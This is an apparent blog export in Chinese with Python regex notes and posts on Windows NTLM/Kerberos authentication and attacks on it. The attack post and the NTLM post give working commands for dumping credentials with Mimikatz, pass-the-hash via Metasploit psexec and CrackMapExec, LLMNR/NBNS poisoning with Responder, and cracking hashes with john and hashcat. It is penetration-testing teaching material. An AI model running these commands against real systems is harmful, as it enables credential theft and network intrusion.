表示匹配任何单词边界。边界即空白或非字母数字字符 \\B 表示与\\b相反。 | 表示‘或’，匹配其中之一。 0x01 转义RE使用\\来进行转义，而Python也使用\\来进行转义，因此要进行双重的转义。例如对\\进行转义： 首先RE先进行转义:\\\\ 然后Python也要对RE的两个\\\\转义：\\\\\\\\ 也可以在字符串前面加r表示这是个Raw字符串。 0x02 RE全局方法 re.match(pattern，string，flag=) 匹配从字符串开始就符合正则模式的字符串。 匹配则返回匹配对象，否则返回none。 re.search(pattern，string，flag=) 匹配第一个符合正则模式的字符串，即只匹配一次。 匹配则返回匹配对象，否则返回none。 findall(pattern，string，flag=) 将字符串中所有匹配的部分作为元素放入一个列表并返回。 finditer(pattern，string，flag=) 与上面一个不同的是，将每次匹配得到的匹配对象放入一个迭代器中，最后返回一个迭代器，而不是列表。 遍历迭代器时，每次返回一个匹配对象。 sub（pattern，repl，string，count=） subn（pattern，repl，string，count=） 匹配模式的字符串部分用repl字符串替代，count指明次数，缺省替换匹配的所有。 subn与sub区别在于，subn会返回新字符串及替换次数。 re.split(pattern，string，max=)：用模式匹配的字符串作为分隔符，分割后返回的是一个列表。max表示最多分割的次数 re.compile(pattern)：对模式进行编译，之后直接使用编译好的模式对象作为模式，对复杂任务效率更高。 可以用re.compile()函数对正则模式字符串进行编译，并返回一个模式类对象：&lt;class &#39;re.Pattern&#39;&gt; 模式类对象自己有match()、search()、findall()、finditer()方法，方法使用与前面的全局方法一样。 上面的方法返回的匹配对象有如下方法： group()：返回匹配字符串。（其实默认传入0参数，意义为查看子组0） start()：返回匹配字符串的开始索引值。（也可以传入子组号） end()：返回匹配字符串的结束索引值。（也可以传入子组号） span()：返回匹配字符串的开始与结束索引到一个元组中(start,end)。（也可以传入子组号） 0x03 标志位（flag）标志位：可以用全称或简写，如re.IGNORECASE等同于re.I，多个标志位|分开，如re.A|re.I。 12345re.ASCII #\\w、\\s等转义字符只匹配ASCII符，仅对Unicode有效。re.DOTALL/re.S #.可以匹配全部字符，包括换行符。re.IGNORECASE/re.I #匹配时不区分大小写。re.MULTILINE/re.M #^$将不止匹配字符串开头和结尾，还匹配每行的行首和行尾。re.VERBOSE/re.X #模式的非转义字符的空格将会被忽略，可以用#进行注释。 0x04 分组分组的作用： 方面一： 跟数学上的一样，被括号括起来后，方便使用*、+、?、{}进行操作。 方面二： 可以对匹配字符串进行再操作、再匹配。 原理： 首先，分组的作用只具有数学上的，将正则模式去匹配字符串，得到匹配字符串，并放入子组0中。 然后，再将每个分组作为模式去匹配第一次得到匹配字符串，得到的结果依次放入子组1,2,3….有多少对括号就有多少个子组，子组号按从左到右的’(‘统计。 group()与groups() 他们都是匹配对象的方法。 group():用于获取指定子组里的匹配字符串。 正则模式匹配的匹配字符串放入子组0，且0是该方法的默认参数。 分组匹配的匹配字符串依次放入1，2，3…..子组 可以传入子组号查看指定子组的内容，且可以一次传入多个子组号，顺序也不要求。 groups():用于获取所有分组的匹配字符串，结果返回一个元组。 只包含分组的匹配字符串，不包含正则模式匹配的匹配字符串。 若使用了findall()方法，返回的将不是匹配对象，而是列表对象。如果也使用了分组，那返回的列表的每个元素是分组匹配的，而不包含正则模式匹配的。 其他： 反向引用，在模式中可以用“[子组号]”来引用前面匹配成功的子组的匹配字符串。 非捕获组：即让分组仅具有数学上意义，而不会再去匹配匹配字符串。 通过在子组()中的最前面加：?： （如: a(?:\\d)+b #\\d将不会再作为模式去匹配） 命名分组：可以给分组进行命名。 通过在子组()中的最前面加：?P&lt;[name]&gt; （如：a(?P&lt;fz1&gt;\\d)+b）命名后，group()方法可以通过名字也可以通过子组号。 断言： 前向肯定断言：如果此分组在此处匹配成功则成功，否则失败。(?=...) #...处是分组正则模式。 前向否定断言：如果此分组在此处匹配成功则失败，否则成功。(?!...) #...处是分组正则模式。 0x05 非贪婪匹配？为非贪婪操作符，*、+、？、{}都是贪婪操作符（?有两重作用）。 通过在贪婪符之后加？，表示让它们尽可能少的匹配。 即先让后面的匹配，自己再匹配，或者说自己尽可能少的匹配，别人尽可能多的匹配。 非贪婪匹配例子 如： pattern1 = ‘.*(\\d+)’ #贪婪匹配 pattern2 = ‘.*?(\\d+)’ #非贪婪匹配 string=‘aa114321’ 贪婪模式下：.*将匹配到aa114321,子组1匹配到1。(re.search(pattern1,string)) 非贪婪模式下（*后面加？）：.*?匹配到aa，因为尽可能少匹配，反过来就是要让后面的尽可能多的匹配，因此子组匹配到114321。(re.findall(pattern2,string)) ​","categories":[{"name":"Python","slug":"Python","permalink":"https://sakuxa.com/categories/Python/"}],"tags":[{"name":"Python模块","slug":"Python模块","permalink":"https://sakuxa.com/tags/Python模块/"},{"name":"Re","slug":"Re","permalink":"https://sakuxa.com/tags/Re/"}]},{"title":"Windows认证攻击","slug":"windows认证攻击","date":"2019-04-06T02:25:26.000Z","updated":"2019-05-21T02:18:33.811Z","comments":true,"path":"2019/04/06/windows认证攻击/","link":"","permalink":"https://sakuxa.com/2019/04/06/windows认证攻击/","excerpt":"窃取Windows凭证、Pass the Hash攻击、Net-NTLM relay攻击。","text":"窃取Windows凭证、Pass the Hash攻击、Net-NTLM relay攻击。 0x00 窃取Windows凭证Mimikatz 我们在前面的文章已经提到过，当用户输入用户名密码登录时，用户名密码会被发送到lsass.exe进程中，然后lsass.exe会将明文密码计算为NTLM Hash，在用户登录期间一直保存在内存中。 Mimikatz是法国人Gentil Kiwi编写的一款Windows平台下的神器，它具备很多功能，其中最亮的功能是直接从lsass.exe进程里获取Windows处于active状态账号的明文密码或NT Hash。在Windows &gt;= 8.1情况下，无法提取明文密码，但是可以提取到NT Hash。 Mimikatz下载链接。 工具演示： LaZagne 既然说到提取密码，那么这里不得不说一款神器，它可以用于用户提取用户计算机上的明文密码。例如浏览器记住的密码、WIFI密码等。具体支持提取的密码有： LaZagne下载地址。 工具演示： 0x01 Pass The Hash在之前的文章中，我们已经知道了Windows在进行Challenge/Response网络验证时，使用的用户密码对应的NT Hash加密Server Challenge得到Response（验证过程中第三个数据包），因此，我们只要知道用户的NT Hash，就可以直接使用Hash向服务器发起认证，并不需要知道明文密码。这种攻击就称之为哈希传递（Pass The Hash）。如果对此还有疑问，请跳转这里学习NTLM网络认证。 常用实现Pass The Hash攻击的工具： Smbmap Smbexec Metasploit CrackMapExec Mimikatz mimikatz “privilege::debug” “sekurlsa::pth /user:abc /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c” 接下来我们使用最后两个工具来模拟进行哈希传递攻击。 NTLM Hash 在使用工具之前，有一点需要注意的是，我们知道早期Windows会存储用户密码对应的两种Hash值：LM Hash:NT Hash，直到Windows Vista和Window Server 2008之后，就只存储NT Hash了。为此，有些工具在给其提供Hash值参数时，需要使用LM Hash:NT Hash这样的格式，即使没有LM Hash，也要使用任意值进行填充以满足格式，通常的做法是填充32个0。但是也有的工具只需要给出NT Hash即可。Metasploit中的psexec和CrackMapExec就分别对应这两种情况。 Meatasploit Psexec Meatasploit中的psexec模块可以实现Hash传递攻击，攻击成功后会返回一个Meterpreter Session。 攻击演示： use exploit/windows/smb/psexec 设置smbpass的格式是LM:NTLM，但在w2k8中，LM已禁用，所以LM处可以随意用32个字符填充满足模块所需的格式即可，比如使用32个0。 CrackMapExec 使用Hash值进行哈希传递攻击，让目标计算机执行指定的命令（-x “cmd”）。 Kali安装CrackMapExec： apt-get install crackmapexec 使用格式： 1crackmapexec smb &lt;IP&gt; -u &lt;Username&gt; -H &lt;NT hash&gt; -x &quot;cmd&quot; 攻击演示： 使用Hash值进行攻击，让目标计算机执行msg adminitrator hacked命令，执行成功后，目标计算机administrator用户的桌面会弹出一个消息框。 注意： 如果目标机器安装了KB2871997补丁，那么将不能进行PTH攻击。 查看主机安装了哪些补丁，Powershell下： Get-WmiObject -class ‘win32_quickfixengineering’ 一些例外： 1.即使打了补丁，rid为500（即管理员，administrator）的用户仍可被PTH。 2.安装补丁kb2871997的Win 7/2008 r2/8/2012，可以使用AES keys代替NTLM Hash。在mimikatz抓hash时，可以一并抓到。 mimikatz “privilege::debug” “sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c” 参考资料 https://mp.weixin.qq.com/s/9EUIamh3L87OWy_uqoJXCw https://mp.weixin.qq.com/s/LZqkclPiZOBtpJJFTiEvQQ 0x02 Net-NTLM Hash relay attack我们知道在网络认证的过程中，数据包传递的并不是NTLM Hash，而是基于NTLM Hash加密challenge随机数得到的Net-NTLM Hash，意味着我们可以通过毒化攻击/中间人攻击获得Net-NTLM Hash,然后对该Hash进行爆破，或者直接使用该Hash进行重放攻击。这小节主要是进行重放攻击。 首先我们知道，SMB、HTTP、LDAP、MSSQL等协议都可以使用NTLM协议进行认证。 主机名称解析流程： 在同一内网环境下，当一台Win机器向另一台Win机器以主机名（hostname）的形式请求相应的资源时,正常的通信大致流程如下： 1、首先,Windows会先去查找自己hosts文件,无法解析主机名则继续往下。（C:\\Windows\\System32\\drivers\\etc\\hosts） 2、检查本地的dns缓存。（ipconfig /displaydns） 3、如果本地缓存不存在记录,则继续向本地网络中配置的dns服务器去请求。 4、最后,如果DNS服务器也解析失败,它就会被交给LLMNR和NetBios-NS协议去处理解析。 LLMNR LLMNR，（Link-Local Multicast Name Resolution），链路本地多播名称解析，是一个基于DNS协议数据包格式的名称解析协议，在DNS不能解析出结果时，最后会使用该协议（以及NBNS）。它存在Windows Vista、Windows Server 2008、Win7、Win8和Win10中。 LLMNR与NBNS对比： 1、NetBIOS基于广播，而LLMNR基于多播（224.0.0.251、UDP 5353）； 2、NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有Windows Vista和更高版本才支持LLMNR； 3、LLMNR还支持IPv6，而NetBIOS不支持。 窃取Net-NTLM Hash Windows下可以使用Inveigh工具 在Linux下可以使用Responder。 metasploit也有auxiliary/spoof/llmnr/llmnr_response、auxiliary/spoof/mdns/mdns_response等模块。 Responder Responder是由LaurentGaffie发布的一款功能强大且简单易用的内网渗透工具，将NetBIOS名称服务（NBNS）、LLMNR和MDNS欺骗集于一身。工具Github地址。 Responder内置了SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、WPAD代理服务器，内建FTP、POP3、IMAP、SMTP服务器用于收集明文的凭据。 当我们启动responder时，它会侦听网络中所有的LLMNR、NBNS名称解析请求数据包，并对请求进行类似于“你要找的机器就是我”的响应，从而将数据引到自己来，并且responder在监听数据包的同时也开启的诸如smb认证服务器等服务，以便在验证中窃取NetNTLM Hash。 这意味着，当用户输入不存在、包含错误或者DNS中没有的主机名时，就会使用LLMNR、NBNS协议在网络中解析主机名，Responder就可以针对这些协议的请求进行响应，并使用内置的认证服务器与用户完成认证交互，然后窃取到NTLMv2 Hash。 工具使用 工具安装：apt-get isntall responder Responder会将所有抓取到的hash打印到标准输出接口上同时会以下面的格式存储到安装目录下的logs/文件夹下。 (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt 参数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344简单启用：responder -I eth0 -vOptions: --version 工具版本。 -h, --help 帮助信息。 -A, --analyze 分析模式。会抓取NBNS、LLMNR、浏览器请求，但不会对请求进行响应，可以用于分析目标网络情况。 -I eth0, --interface=eth0 指定网络接口，可以指定&apos;ALL&apos;来使用所有接口。 -i 10.0.0.21, --ip=10.0.0.21 Local IP to use (only for OSX) -e 10.0.0.22, --externalip=10.0.0.22 以另一个外部机器的IP进行响应，意味着后面的数据会被引到该IP机器。 -b, --basic Return a Basic HTTP authentication. Default: NTLM -r, --wredir Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False -d, --NBTNSdomain Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False -f, --fingerprint This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query. -w, --wpad Start the WPAD rogue proxy server. Default value is False -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port) -F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False -P, --ProxyAuth Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn&apos;t need to be ON. This option is highly effective when combined with -r. Default: False --lm Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False -v, --verbose Increase verbosity. 工具配置文件路径：/usr/share/responder/Responder.conf 修改配置文件只针对特定主机响应： 工具演示： 在网络中启用工具。 抓取到Hash： 参考链接： https://mp.weixin.qq.com/s/2CYuNRQIzIDWlU7nWiJ67w https://2018.zeronights.ru/wp-content/uploads/materials/08-Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know.pdf https://www.secpulse.com/archives/65503.html http://baijiahao.baidu.com/s?id=1599333064699003609&amp;wfr=spider&amp;for=pc https://www.jianshu.com/p/1b545a8b8b1e https://blog.csdn.net/vevenlcf/article/details/80887753","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://sakuxa.com/categories/内网渗透/"}],"tags":[{"name":"Pass The Hash","slug":"Pass-The-Hash","permalink":"https://sakuxa.com/tags/Pass-The-Hash/"},{"name":"Mimikatz","slug":"Mimikatz","permalink":"https://sakuxa.com/tags/Mimikatz/"}]},{"title":"Windows认证之Kerberos","slug":"02-Windows认证之Kerberos","date":"2019-04-03T03:58:35.000Z","updated":"2019-05-21T02:23:00.535Z","comments":true,"path":"2019/04/03/02-Windows认证之Kerberos/","link":"","permalink":"https://sakuxa.com/2019/04/03/02-Windows认证之Kerberos/","excerpt":"Kerberos起源于希腊神话，是一只守护着冥界长着3个头颅的神犬，在Kerberos认证中，Kerberos的3个头颅也代表认证过程中涉及的三方：Client、Server、KDC。 Kerberos是一种网络认证协议，它允许某实体在非安全网络环境下，向另一个实体以一种安全的方式证明自己的身份。 Windows的AD域环境使用Kerberos来进行验证。","text":"Kerberos起源于希腊神话，是一只守护着冥界长着3个头颅的神犬，在Kerberos认证中，Kerberos的3个头颅也代表认证过程中涉及的三方：Client、Server、KDC。 Kerberos是一种网络认证协议，它允许某实体在非安全网络环境下，向另一个实体以一种安全的方式证明自己的身份。 Windows的AD域环境使用Kerberos来进行验证。 0x00 Long-term Key与Short-term Key在 Security 领域中，有的密钥可能长期保持不变，比如你的密码，可能几年都不曾改变，这样的 Key 被称为 Long-term Key。 使用Long-term Key应该有以下原则： 1.被Long-term Key加密的数据包不应在网络中传输，或者说不要用Long-term Key加密数据包。原因在于如果加密的数据包被攻击者抓包截取，那么只要时间充足，密钥被爆破出来的风险是很大的。 2.Long-term Key不应该使用明文方式存储，好的方法是用摘要算法计算其Hash值，从而保存Hash值。因为我们知道Hash算法是不可逆的，且不同输入计算出来的Hash是不同的，因此理论上拥有Hash值是不可能逆向破解获得明文Key，除非进行Hash碰撞，即对Hash算法尝试不同的输入，然后将算法输出Hash值与我们要破解的Hash值对比，本质是暴力破解。 我们一般会使用 Short-term Key 来加密需要进行网络传输的数据。顾名思义，这种 Key 只在短时间内有效，因此即使被加密的数据包被黑客截获，等他把 Key 计算出来的时候，这个 Key 也早就已经失效了。 由此我们也引出一个问题： 我们知道加密通信数据应该使用Short-term Key，但是Short-term Key作为一个短期有效的密钥，其管理分发是一个问题，即通信双方该如何即安全又便捷的协商出一个只有双方知道的Short-term Key呢？ Kerberos认证的第一阶段和第二阶段其实就是协商出通信所需的Short-term Key的过程。 在Kerberos认证中，Short-term Ke被称为Session Key。而Windows用户的密码就是我们前面说的Long-term Key，它以NTLM Hash方式存储在服务器中。 0x01 KDC(Key Distribution Center)KDC(Key Distribution Center)，即密钥分发中心，作为第三方信任机构为C/S提供认证。 担任KDC的角色在物理层面上与DC(Domain Controller)，即域控所属同一主机。 KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下部分组成： AS（Authentication Service）：主要用于生成Client与TGS通信的Session Key，记K(c,tgs)以及TGT。 TGS（Ticket Granting Service）：主要用于生成Client与Server通信的Session Key，记K(c,s)以及Tiket。 AD(Account Database)，它作为账户管理数据库，用与存储用户认证信息，即密码的NTLM Hash等。 0x03 Kerberos认证大致流程 第一阶段（AS Exchange）：生成一个用于加密Client与TGS的通信的Session Key。 生成K(c,tgs)的两份Copy，一份加密用于给Client，一份加密为TGT用于给TGS（但先发给Client，让其发给TGS）。 第二阶段（TGS Exchange）：生成一个用于加密Client与Server通信的Session Key。 生成K(c,s)的两份Copy，一份加密用于给Client，一份加密为Tiket用于给Server（但先发给Client，让其发给Server）。 第三阶段（CS EXchange）：Client与Server之间验证并使用K(c,s)加密通信。 0x04 Kerberos认证第一阶段：Authentication Service Exchange KRB_AS_REQ 首先，客户端发送请求给KDC AS，请求消息包含以下三部分： Pre-authentication data：用以证明Client身份的信息，它的内容是一般是被Client的NTLM Hash加密的 Timestamp。 Client name &amp; realm：Client自身信息，简单地说就是 DomainName\\Username，KDC AS用其查找AD数据库看用户是否存在。 Server Name：注意这里的ServerName并不是Client实际想要通信的Server，而是KDC TGS服务器的名称。 KRB_AS_REP KDC收到请求消息后，根据提供的用户名在AD(Account Database)中寻找是否存在。 若存在，则将产生一个Session Key，记K(c,tgs)，并且将其生成两份Copy，分别用于给Client和KDC TGS。 对于给Client的那份Session Key，KDS AS会从AD(Account Database)中获取Client的NTLM Hash对其进行加密。 对于给KDC TGS的那份Session Key，KDS AS会从AD(Account Database)中获取krbtgt用户的NTLM Hash对其及其它信息进行加密，称为TGT（Ticket Granting Ticket）。 TGT中除了Session Key，还包括一些Client的用户名（DomainName\\Username）、End time（TGT 到期的时间）等信息。 krbtgt用户是在新建一台域控制器时，由系统自动创建使得，用于Kerberos认证用的。因此TGT只有KDC能解密。 虽然产生的TGT是用于给KDC TGS的，但是KDC还是会把两份都发给Client，KDC TGS那份由Client发给KDC TGS。之所以这样做的目的是： 首先Server不用维护一张庞大的会话密钥列表来应付不同的Client的访问，降低了Server的负荷； 其次避免出现因为网络延时，Client的认证请求比Server的会话密钥早到达Server端，进而导致认证失败的情况。 0x05 Kerberos认证第二阶段：Ticket Granting Service Exchange KRB_TGS_REQ 根据前面我们可以知道，此时Client拥有两份加密的Session Key，分别是 用自己NTLM Hash加密的Session Key。 用krbtgt用户的NTLM Hash加密的TGT。 首先，Client会使用自己的NTLM Hash解密属于自己的那份，解密后获得Session Key。 接着，Client会生成鉴别码（Authenticator），并使用Session Key对鉴别码进行加密。 鉴别码实际主要是Client的信息（DomainName\\Username）、ServerName(DomainName\\Server)以及当前时间的时间戳。 此处的ServerName是Client真正想访问的Server。 鉴别码的作用主要是为了证明该消息是Client自己发的。 最后，Client将加密的鉴别码与TGT发给KDC TGS。 KRB_TGS_REP KDC TGS收到消息后，先使用自己（krbtgt）的NTLM Hash对TGT进行解密，获得Session Key、Client信息、TGT过期时间等信息。 然后使用Session Key解密被Client加密的鉴别码，获得Client信息、时间戳等信息。 比对两次解密得到的时间戳，确保在可允许的范围。 时间同步的重要性： 我们知道不管是Session Key还是票据都是有时效性的，TGT通常是8个小时，时效性的判断主要是用数据包传递的时间戳（Timestamp）与本地的时间做比较，因此Client、Server、KDC三者的时间同步是很重要，否则可能会造成验证失败，通常它们都需要配置从同一时间服务器同步时间。 验证通过后，KDC TGS会生成一个Session Key，记K(c,s)，该Session Key用于给Client和Server通信使用。 将K(c,tgs)加密K(c,s)，用于给Client。 同时也会生成一个Tiket用于给Server，并用Server的NTLM Hash加密该Tiket。Tiket包含： 用于给Client和Server通信使用Session key，即K(c,s)。 Client的一些信息，如用户名。 Tiket过期时间。 可以发现这个阶段与上一个阶段是类似，KDC同样会把这两份加密了的Session Key都发给Client。 0x06 Kerberos认证第三阶段：Client/Server ExchangeKRB_AP_REQ 此时Client同样拥有两份加密的Session Key，K(c,s)。分别是 用自己NTLM Hash加密的Session Key。 用Server的NTLM Hash加密的Tiket。 接着Client会使用自己的NTLM Hash解密属于自己的那份，解密后获得K(c,s)。 使用K(c,s)加密鉴别码，将加密的鉴别码同Tiket发给服务器。 KRB_AP_REP Server收到消息后，先使用自己的NTLM Hash对Tiket进行解密，获得Session Key、Client信息、TGT过期时间等信息。 然后使用Session Key解密被Client加密的鉴别码，获得Client信息、时间戳等信息。 过程与KRB_TGS_REP阶段差不多，不再赘述。 但有一点是， 如果Client需要进行双向验证，Server从鉴别码中提取时间戳，使用K(c,s)进行加密，并将其发送给Client用于Client验证Server的身份。 白银票据（Silver Tiket）通过前面我们已经知道Kerberos的认证大致流程，在第三阶段认证的KRB_AP_REQ时，Client拥有两份加密的Session Key，K（c,s）分别是： 用自己NTLM Hash加密的Session Key。 用Server的NTLM Hash加密的Tiket。 Tiket只有Server可以解密，这是因为Tiket是使用Server的NTLM Hash进行加密的。但是这也意味着如果我们拥有Server的Hash，那么意味着我们可以解密以及伪造Tiket，从而绕过KDC直接进行验证。 黄金票据（Golden Tiket）通过前面我们已经知道Kerberos的认证大致流程，在第二阶段认证的KRB_AS_REQ时，Client拥有两份加密的Session Key，K（c,tgs）分别是： 用自己NTLM Hash加密的Session Key。 用krbtgt用户的NTLM Hash加密的TGT。 前面我们说过，TGT只有KDC可以解密，这是因为TGT是使用krbtgt用户的NTLM Hash进行加密的，而该Hash只有KDC知道。但是这也意味着如果我们拥有krbtgt用户的Hash，那么意味着我们可以解密以及伪造TGT， 参考资料： https://blog.csdn.net/lengxiao1993/article/details/20458809 https://payloads.online/archivers/2018-11-30/1?tdsourcetag=s_pcqq_aiomsg#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB---kerbroes https://klionsec.github.io/2016/08/10/ntlm-kerberos/?tdsourcetag=s_pcqq_aiomsg https://blog.csdn.net/wulantian/article/details/42418231","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://sakuxa.com/categories/内网渗透/"}],"tags":[{"name":"Kerberos","slug":"Kerberos","permalink":"https://sakuxa.com/tags/Kerberos/"}]},{"title":"Windows认证之NTLM","slug":"01-Windows认证之NTLM","date":"2019-04-03T03:58:18.000Z","updated":"2019-05-21T02:34:07.501Z","comments":true,"path":"2019/04/03/01-Windows认证之NTLM/","link":"","permalink":"https://sakuxa.com/2019/04/03/01-Windows认证之NTLM/","excerpt":"一直对于Windows认证的相关知识感觉到混乱与困扰，为了让自己更好的理解，本文尝试对现有的大多资料进行梳理，理清LM Hash、NT Hash、NTLM、NTLM Hash等的概念与原理。","text":"一直对于Windows认证的相关知识感觉到混乱与困扰，为了让自己更好的理解，本文尝试对现有的大多资料进行梳理，理清LM Hash、NT Hash、NTLM、NTLM Hash等的概念与原理。 0x00 Windows密码存储We all konw，明文存储密码是很愚蠢的行为，因为如果系统被攻破，明文密码被拿到，那么意味就全完了，但是如果是先加密再进行存储的话，即使黑客拿到加密的密码，破解也是需要费很大功夫和时间的。 而现在采用的加密算法基本都是Hash摘要算法，Hash算法可以把任意长度的输入通过散列算法输出一串固定长度的值。 常见的Hash算法诸如md5、SHA等，Hash算法有如下特点： 单向不可逆性：通过Hash值无法反向推导出输入的值。 如果两个哈希值相同，两个输入值很可能(极大概率)是相同的，但也可能不同，这种情况称为“哈希碰撞” 说了那么多就是为了表明一点，Windows在存储用户密码时也不直接存储明文密码，存储的是明文密码经过Hash计算得到的Hash值，Windows存储的Hash称为NTLM Hash，或者NTLM。 存储路径： 首先用户密码的Hash肯定需要存储在系统的某个文件或数据库中，Windows将用户密码计算得到的Hash存储在： 工作组或本地环境中，存储在一个名为SAM的文件内，文件路径为：%SystemRoot%\\system32\\config\\sam 如果是域环境，它们还存储在NTDS.dit数据库中。 存储格式： Windows会存储用户密码对应的两种Hash，分别是LM Hash和NT Hash，它们是如何计算的，我们下节讨论。但要注意的一点是，从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NT Hash，LM Hash将不再存储。 格式： 1username : unique_identifier : LM hash : NT hash username即用户名。 unique_identifier即盐（salt）。 Windows将用户的密码计算为LM Hash和NT Hash，然后将它们使用冒号:分割存储在数据库中。 0x01 NT Hash与LM HashLM Hash是早期Windows存储的Hash格式，从Windows Vista/Server 2008开始默认是关闭的。 NT Hash是现在Windows主要的存储的Hash。 NT Hash算法： 1.先将用户密码转换为十六进制格式。 2.将十六进制格式的密码进行Unicode编码。 3.使用MD4摘要算法对Unicode编码数据进行Hash计算，得到结果就是NT Hash。 123admin -&gt; hex(16进制编码) = 61646d696e61646d696e -&gt; Unicode = 610064006d0069006e00610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634 破解方式： 12john --format=nt hash.txthashcat -m 1000 -a 3 hash.txt LM Hash算法： 1234567891011121314151617181920212223将所有小写字母转换为大写字母&gt;123ABC // 未达到7个字符将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补&gt;31323341424300000000000000将密码分割为两组7个字符&gt;31323341424300 00000000000000 //16进制将每组转化为比特流，不足56Bit则在左边加0&gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补足56Bit) 00110001001100100011001101000001010000100100001100000000将比特流按照7比特一组，分出8组，末尾加0由于后者都为0，结果可想而知，那就都是0;将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个结果转换为16进制。-&gt; 00110000100110001000110001101000000101000001001000001100 00000000-&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C由于我们的密码不超过7字节，所以后面的一半是固定的:AA-D3-B4-35-B5-14-04-EE连接两个DES加密字符串。得到LM哈希。48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE 通过算法我们可以看到LM Hash脆弱点就在于DES的Key（KGS!@#$%）是固定的，也就是说，有了Key就能够解出原文。 并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。 破解方式： 12john --format=lm hash.txthashcat -m 3000 -a 3 hash.txt 用Python计算Hash并与系统(win10)内存存储的Hash对比： 0x02 NTLM v1/v2（AKA Net-NTLM v1/v2） NTLM（NT LAN Manager），又称为Net-NTLM，是一个网络认证协议，他是一种用于在Client和Server之间进行Challenge/Response验证的协议。 NTLM v1/v2与LM、NT Hash的关系： NTLM是一个认证协议，使用LM Hash或NT Hash来进行验证。 在NTLM v1中，使用LM Hash和NT Hash来进行验证，如今v1已被废弃。 自从Windows 2000之后，NTLM v2是默认的认证协议。 NTLM v1与NTLM v2之间的区别我们放在网络认证的章节来讨论。 0x03 本地认证 所谓的本地认证即在物理主机上直接进行登录的认证过程。 本地认证的大致流程： winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证) Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。 LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。 具体流程： 1.当我们刚开机、注销等操作后，winlogon.exe进程会显示一个登录界面要求我们输入用户名和密码。 2.我们输入用户名和密码后，会被winlogon.exe获取，然后将其发送给lsass.exe进程。 3.lsass.exe将明文密码计算得到NT Hash（不考虑LM）。 4.之后会将用户名和计算得到的NT Hash拿到SAM数据库去查找比对。 0x04 网络认证 网络认证，顾名思义即通过网络进行认证，常见于工作组环境中，例如访问共享时进行的认证就是网络认证。网络认证使用的协议为NTLM协议。 NTLM v2认证流程： 认证流程大致可以分为三步： 协商：主要用于确认双方协议版本。 质询：进行挑战（Chalenge）/响应（Response）认证机制的阶段，是最重要的阶段，也是我们主要讨论的环节。 验证：质询完成后，验证结果。 质询的完整过程： 客户端向服务器端发送包含用户信息(用户名)的请求。 服务器接受到请求后，先使用接收到用户名到SAM数据库中查找看是否存在，若存在则提取对应的NT Hash。 然后服务器会生成一个16位的随机数，称之为“Challenge”，并使用提取的NT Hash加密Challenge(16位随机字符)，得到加密结果记作Challenge2存储在内存中。同时，将Challenge(16位随机字符)发送给客户端。 客户端接受到Challenge后，使用将要登录的账户对应的NT Hash加密(HAMC-MD5算法)Challenge生成Response(将明文密码计算为NT Hash是客户端计算机接收到用户输入的密码后自动做的事情)，然后将Response发送至服务器端。 验证： 服务器端收到客户端的Response后，比对Chanllenge2与Response是否相等，若相等，则认证通过。 抓包分析认证过程： 实验环境介绍： w2k8 r2建立一个文件共享，Win 10客户端访问文件共享，访问共享时需要进行登录认证，在Win 10客户机使用Wireshark进行抓包。 w2k8 r2：192.168.1.102 Win 10：192.168.1.101 用户名：administrator 密码：@superwu123 抓包分析： 先来看一下抓到的包总体情况,如下图。 接下来我们直接看NTLM认证过程的第二个数据包，可以看到服务器返回了Challenge，记作NTLM Server Challenge，值为：79f3c64adead4f15。 Net-NTLM Hash 这里插入一段介绍Net-NTLM Hash。 Net-NTLM Hash用于Net-NTLM协议进行网络身份验证（它们来自质询/响应算法，并基于用户的NT Hash）。 Net-NTLM Hash我认为并不是具体的一种Hash值，而是一种格式，从NTLM认证过程数据包中提取一些信息拼凑起来得到的格式。 根据协议版本的不同，Net-NTLM Hash又分为Net-NTLMv1 Hash和Net-NTLMv2 Hash。 Net-NTLMv2 Hash格式： 1username::hostname:challenge:HMAC-MD5:blob username即用户名。 hostname即服务器IP（或主机名）。 challenge是Server Challenge，即服务器返回的随机数。 HMAC-MD5对应数据包中的NTProofStr字段。 blob对应数据包中NTLMv2 Response的NTProofStr之后的部分。 紧接着我们看下一个数据包（Response），可以先看到有一个NTLM v2 Response，然后NTLMv2 Client Challenge就是客户端加密Server Challenge得到的。 NTLM v2 Response值为： 1234567891011121314151617181920212223&gt; 09 68 4a af 9d 32 8a 4c c2 3c 30 1d 70 61 23 2d&gt; 01 01 00 00 00 00 00 00 32 3b 26 fa 22 ec d4 01&gt; ae d4 bf 39 